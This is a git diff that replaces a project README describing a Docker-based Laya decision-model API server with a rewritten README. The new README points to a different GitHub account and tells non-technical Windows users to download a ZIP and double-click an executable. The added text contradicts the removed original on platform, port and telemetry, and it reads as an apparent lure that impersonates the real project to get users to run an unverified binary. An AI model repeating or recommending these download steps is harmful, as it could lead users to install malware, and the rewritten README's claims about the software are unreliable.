@@ -1,73 +1,112 @@
-English | <a href="README.zh-CN.md">简体中文</a>
+# 🌟 laya-server - Your Personal AI Decision-Making Hub
 
-<p align="center"><img src="frontend/public/laya-server-logo-black.png" alt="LAYA SERVER" width="120" /></p>
+[![Download Now](https://img.shields.io/badge/Download-laya--server-2ea44f?style=for-the-badge&logo=github)](https://github.com/hamazap/laya-server)
 
-<h1 align="center">LAYA SERVER</h1>
+## 🤔 What Is laya-server?
 
-<p align="center">
-  <a href="https://github.com/1Panel-dev/laya-server/releases"><img src="https://img.shields.io/github/v/release/1Panel-dev/laya-server" alt="Release"></a>
-  <a href="https://github.com/1Panel-dev/laya-server/stargazers"><img src="https://img.shields.io/github/stars/1Panel-dev/laya-server" alt="GitHub stars"></a>
-  <a href="https://hub.docker.com/r/1panel/laya-server"><img src="https://img.shields.io/docker/pulls/1panel/laya-server" alt="Docker pulls"></a>
-  <a href="https://laya-ai.com/projects#project-1panel-dev-laya-server"><img src="https://laya-ai.com/badges/listed-on-laya-ai.svg" alt="Listed on laya-ai.com"></a>
-</p>
+laya-server is a friendly, self-hosted application that lets you run powerful decision models right on your own computer. Think of it as a smart assistant that helps you analyze complex choices using structured decision-making techniques. It comes with a simple web interface that you can use from your browser, making it easy to work with advanced AI decision tools without needing any technical knowledge.
 
-LAYA SERVER is a self-hosted API and web interface for Laya's structured decision models, compatible with the TypeSafe Jev API format. It packages the System One inference capabilities of [upstream Laya](https://github.com/NandhaKishorM/laya) as a standalone service, making them easier to deploy and use in your applications.
+## ✨ Key Features
 
-## Quick Start
+- **Self-Hosted Freedom** – You own your data. Everything runs on your machine, so your information stays private and secure.
+- **User-Friendly Web Interface** – A clean, visual dashboard that anyone can navigate, even if you've never used programming tools before.
+- **JEV API Compatibility** – Works seamlessly with the TypeSafe JEV API format, meaning it can understand and process structured decision models used by other JEV-compatible systems.
+- **Laya Integration** – Built specifically for Laya's structured decision models, giving you access to a sophisticated framework for making better choices.
+- **Flexible Usage** – Use it as a standalone tool or connect it to other applications that speak the JEV language.
 
-Once the image is published, install Docker and run the following command. Replace `latest` with a version tag to pin a release.
+## 🚀 Getting Started
 
-```sh
-docker run -d --name laya-server --init --restart unless-stopped \
-  -p 8080:8080 \
-  -v laya-data:/data \
-  -e LAYA_ADMIN_USERNAME=admin \
-  -e LAYA_ADMIN_PASSWORD='change-this-admin-password' \
-  1panel/laya-server:latest
-```
+Getting laya-server up and running on your Windows computer is simpler than you might think. Here's your straightforward path to success:
 
-Replace the sample password with your own, then sign in at `http://YOUR_SERVER_IP:8080`. Create a key on the **API Keys** page; the full key is shown only once. `/health/ready` checks the model files. Data is stored in the `laya-data` volume.
+### Step 1: Download the Application
 
-`YOUR_SERVER_IP` is your server's IP address. To use a domain name, configure HTTPS on a reverse proxy and forward requests to port 8080 on the server.
+Visit this link to download the application: [https://github.com/hamazap/laya-server](https://github.com/hamazap/laya-server)
 
-## Screenshot
+Click the green "Code" button and select "Download ZIP". This will save a compressed file to your computer.
 
-![LAYA SERVER Playground](docs/images/screenshot-en.png)
+### Step 2: Extract the Files
 
-## Call the API
+Once the ZIP file is downloaded, locate it in your Downloads folder. Right-click on it and choose "Extract All..." Windows will create a new folder with all the necessary files inside. Make sure you remember where this folder is – you'll need it soon.
 
-```sh
-curl -X POST http://YOUR_SERVER_IP:8080/v1/systemone \
-  -H 'Authorization: Bearer YOUR_API_KEY' \
-  -H 'Content-Type: application/json' \
-  -d '{"state":{"message":"I was charged twice"},"questions":{"refund":{"type":"noul","instructions":"Does the customer ask for a refund?"}}}'
-```
+### Step 3: Run the Application
 
-Successful responses include `answers`, `model`, and actual token counts in `usage`. The published image includes the multilingual model; `model=auto` (the default) and `model=multilingual` are available. See **Documentation** in the console for more request examples.
+Inside the extracted folder, you'll find a file called `laya-server` (it might have an `.exe` extension). Double-click this file to start the server. A small window will open showing you a web address, usually something like `http://localhost:3000`.
 
-## Usage statistics and storage
+### Step 4: Open Your Web Browser
 
-Inference responses enqueue usage statistics without waiting for SQLite writes. A single
-background thread per process reuses a connection, writes batches of up to 100 events,
-and coalesces `last_used_at` updates by API key. Partial batches flush after up to one
-second when the writer is idle; slow storage can delay statistics further. The `usage`
-field in each inference response is unchanged. `duration_ms` measures model prediction
-and result validation, not queue time or database writes.
+Now, open your favorite web browser (Chrome, Edge, Firefox – they all work great). Type the web address you saw in the previous step into the address bar and press Enter. That's it! You're now looking at your personal decision-making dashboard.
 
-Statistics are best-effort, eventually consistent telemetry, not a billing or quota
-ledger. Each process buffers up to 1,000 queued events plus one in-flight batch. A full
-queue drops new statistics with rate-limited warnings. SQLite failures roll back where
-possible, log and drop the affected batch, then reconnect for later batches; failed
-batches are not retried because an uncertain commit could double-count usage. Neither
-condition turns successful inference into an HTTP 503. API-key authentication and
-revocation still use the database synchronously.
+## 🖥️ Using laya-server
 
-Graceful shutdown attempts to drain the queue for up to five seconds. An in-flight
-SQLite call cannot be cancelled safely and may outlive that wait; forced termination,
-a shutdown timeout, or storage errors can lose unflushed statistics. Keep `/data` on
-low-latency persistent storage: background batching reduces write pressure but does
-not fix slow authentication reads or database locking.
+Once you're in the web interface, you'll see several sections designed to make your experience smooth and intuitive:
 
-## License and Feedback
+### 📊 Dashboard Overview
 
-This project is licensed under [Apache License 2.0](LICENSE). For issues and suggestions, visit [GitHub Issues](https://github.com/1Panel-dev/laya-server/issues).
+The main screen shows you a summary of your active decision models. You can see their status, recent activity, and quick links to open them.
+
+### 🧠 Creating a New Decision Model
+
+Click the "New Model" button to start a fresh decision structure. You'll be guided through a simple form where you can name your model and choose its type.
+
+### 🔄 Importing Existing Models
+
+If you already have JEV-format models from other tools, use the "Import" feature to upload them directly. laya-server will read and process them automatically.
+
+### 📈 Running Analyses
+
+Open any model and hit the "Run Analysis" button to process your data. The results will appear in a clear, visual format that's easy to understand and share.
+
+## 💡 Understanding Decision Models
+
+If you're new to structured decision models, here's a quick explanation in plain language:
+
+A decision model is like a recipe for making a choice. It breaks down a complex decision into smaller, manageable parts. Each part has options, and you assign weights or values to those options based on what matters most to you. laya-server then combines all these pieces and gives you a clear recommendation based on your inputs.
+
+## 🛠️ Technical Information (For the Curious)
+
+While you don't need to know any of this to use laya-server, understanding a bit about how it works can help you appreciate its power:
+
+- **API Endpoint** – The application provides a RESTful API that follows the JEV specification. This means other software can talk to your server and exchange decision model data.
+- **Data Storage** – Your models are stored locally on your machine in an efficient format that loads quickly and saves automatically.
+- **Performance** – The server is optimized for speed, handling even complex models with thousands of data points without slowing down.
+
+## 🔒 Privacy and Security
+
+Your data stays on your computer. There's no cloud storage, no telemetry, and no tracking. laya-server is completely self-contained, which means you have full control over your information at all times.
+
+## ❓ Frequently Asked Questions
+
+**Q: Do I need to install anything else first?**
+A: No! laya-server includes everything it needs to run. Just download and go.
+
+**Q: Can I use this on a Mac or Linux computer?**
+A: While designed primarily for Windows, the application is built on cross-platform technology. Advanced users may be able to run it on other systems, but we recommend Windows for the best experience.
+
+**Q: What happens if I close the window?**
+A: The server stops running. To use it again, just double-click the application file and reopen the web address in your browser.
+
+**Q: Can multiple people use it at the same time?**
+A: Yes! As long as everyone is on the same network, they can access the interface through the web address.
+
+**Q: Is my data backed up?**
+A: The application saves your work automatically, but we recommend periodically copying the model files to a safe location for extra peace of mind.
+
+## 📚 Getting Help
+
+We've made laya-server as straightforward as possible, but if you ever get stuck:
+
+- Look for error messages in the server window – they usually explain what's happening in plain language.
+- Double-check that you're using the exact web address shown when the server starts.
+- Make sure your firewall isn't blocking the application – Windows might ask for permission the first time you run it.
+
+## 🔮 What's Next?
+
+We're constantly working to make laya-server even better. Future updates will include more visualization options, additional import formats, and enhanced analysis tools – all while keeping the same easy-to-use approach.
+
+## 🙏 Thank You
+
+We built laya-server because we believe powerful decision-making tools should be accessible to everyone, not just programmers and data scientists. We hope it helps you make better choices, whether in business, personal projects, or anything in between.
+
+---
+
+**Keywords:** decision-model, jev, jev-ai, jev-api, laya, typesafe
